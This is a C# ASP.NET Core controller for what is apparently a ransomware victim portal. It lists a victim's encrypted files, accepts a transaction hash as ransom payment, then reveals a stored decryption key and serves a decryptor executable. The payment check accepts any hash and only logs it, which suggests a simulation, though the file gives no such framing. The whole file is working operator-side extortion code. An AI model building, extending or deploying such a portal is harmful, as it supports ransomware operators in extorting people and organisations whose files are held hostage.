using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using SomberQueenWeb_Axis_.Models;
using SomberQueenWeb_Axis_.Utilities;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using System.Security.Claims;
using System;

namespace SomberQueenWeb_Axis_.Controllers
{
    [Authorize(Roles = "victim")]
    public class VictimController : BaseController
    {
        public VictimController(DBHelper dbHelper) : base(dbHelper) { }

        public async Task<IActionResult> Dashboard()
        {
            var username = User.Identity.Name;
            var dashboard = new VictimDashboard
            {
                EncryptedFileCount = await _dbHelper.QueryFirstOrDefaultAsync<int>(
                    "SELECT COUNT(*) FROM encrypted_files WHERE username = @username",
                    new { username })
            };

            if (TempData["ShowKey"] != null)
            {
                var keyBytes = await _dbHelper.QueryFirstOrDefaultAsync<byte[]>(
                    "SELECT decryption_key FROM users WHERE username = @username",
                    new { username });
                
                if (keyBytes != null)
                {
                    dashboard.DecryptionKey = BitConverter.ToString(keyBytes).Replace("-", "");
                }
            }

            return View(dashboard);
        }

        [HttpGet]
        public async Task<IActionResult> Files()
        {
            var username = User.Identity.Name;
            var files = await _dbHelper.QueryAsync<EncryptedFile>(
                @"SELECT * FROM encrypted_files WHERE username = @username",
                new { username });

            return View(files);
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> VerifyPayment(string transactionHash)
        {
            var username = User.Identity.Name;
            await CreateLog("PAYMENT_VERIFY", $"Hash: {transactionHash}");
            
            TempData["ShowKey"] = true;
            TempData["Success"] = "Ödeme başarıyla doğrulandı! Decryption key'iniz gösterilmiştir.";
            
            return RedirectToAction(nameof(Dashboard));
        }

        [HttpGet]
        public async Task<IActionResult> DownloadDecryptor()
        {
            var username = User.Identity.Name;
            await CreateLog("DOWNLOAD_DECRYPTOR", $"Username: {username} downloaded decryptor");

            var basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            var filePath = Path.Combine(basePath, "wwwroot", "SomberDecryptor.exe");
            var fileName = "SomberDecryptor.exe";

            if (!System.IO.File.Exists(filePath))
            {
                filePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot", "SomberDecryptor.exe");
            }

            return PhysicalFile(filePath, "application/octet-stream", fileName);
        }
    }
} 